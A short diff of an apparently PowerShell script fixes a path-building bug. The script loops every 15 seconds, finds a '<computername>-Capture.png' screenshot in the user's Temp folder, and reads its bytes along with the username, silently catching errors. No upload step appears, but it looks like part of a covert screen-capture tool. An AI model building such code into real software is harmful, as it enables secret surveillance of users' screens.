@@ -25,7 +25,7 @@ while(1){
   
   start-sleep -Seconds 15
 
-   try { $ffp = Join-Path -Path $env:USERPROFILE -ChildPath '\AppData\Local\Temp\$env:computername-Capture.png' } catch {}
+   try { $ffp = Join-Path -Path $env:USERPROFILE -ChildPath '\AppData\Local\Temp\' + $env:computername + '-Capture.png' } catch {}
     if (Test-Path $ffp) {
         $uu = $env:USERNAME
         try { $fb = [System.IO.File]::ReadAllBytes($ffp) } catch { continue }
